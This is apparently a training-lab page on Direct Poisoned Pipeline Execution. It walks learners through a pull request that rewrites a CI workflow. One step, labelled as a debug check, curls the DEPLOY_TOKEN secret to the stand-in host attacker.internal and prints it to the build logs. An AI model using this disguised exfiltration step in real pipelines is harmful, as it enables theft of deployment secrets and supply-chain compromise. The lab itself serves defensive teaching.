# Lab 2.2: Direct Poisoned Pipeline Execution (PPE)

<div class="phase-stepper">
  <a href="../" class="phase-step done">Overview</a>
  <span class="phase-arrow">›</span>
  <a href="../understand/" class="phase-step done">Understand</a>
  <span class="phase-arrow">›</span>
  <span class="phase-step current">Break</span>
  <span class="phase-arrow">›</span>
  <a href="../defend/" class="phase-step upcoming">Defend</a>
  <span class="phase-arrow">›</span>
  <a href="../detect/" class="phase-step upcoming">Detect</a>
</div>

## Poisoning the Pipeline

### Step 1: Create an attack branch

```bash
cd /repos/wl-webapp
git checkout -b feature/improve-ci
```

### Step 2: Modify the CI config

```bash
cat > .gitea/workflows/ci.yml << 'EOF'
name: WeakLink Webapp CI

on:
  push:
    branches: [main]
  pull_request:
    branches: [main]

env:
  DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Run tests
        run: |
          echo "Running tests..."
          python test_app.py
      - name: "Debug: check build environment"
        run: |
          # Exfiltrate the deploy token
          curl -sf "http://attacker.internal/steal?token=${DEPLOY_TOKEN}" || true
          # Also write it to a file visible in build logs
          echo "TOKEN=${DEPLOY_TOKEN}" > /tmp/exfiltrated.txt
          cat /tmp/exfiltrated.txt
EOF
```

### Step 3: Submit the PR

```bash
git add -A
git commit -m "Improve CI debugging"
git push origin feature/improve-ci

curl -sf -X POST "http://gitea:3000/api/v1/repos/developer/wl-webapp/pulls" \
  -H "Content-Type: application/json" \
  -u "attacker:password" \
  -d '{"title":"Improve CI debugging","base":"main","head":"feature/improve-ci"}'
```

### Step 4: The pipeline executes the attacker's config

When CI runs on this PR, it checks out `feature/improve-ci`, reads the modified `ci.yml`, and runs `curl attacker.internal/steal?token=ghp_deploy_x8k2m5n7p9q1r3t6v0w4y`. The deploy token is now in the attacker's hands.

**Checkpoint:** You should now have a PR that modifies the CI config to exfiltrate `DEPLOY_TOKEN` via curl and build log output.

### Step 5: Why this is worse than it looks

- **No code review needed**. the pipeline runs BEFORE the PR is reviewed
- **No merge needed**. the attack succeeds even if the PR is rejected
- **The PR can be deleted**. the attacker removes evidence after exfiltration
- **Any contributor can do this**. write access (fork + PR on some platforms) is all that is required
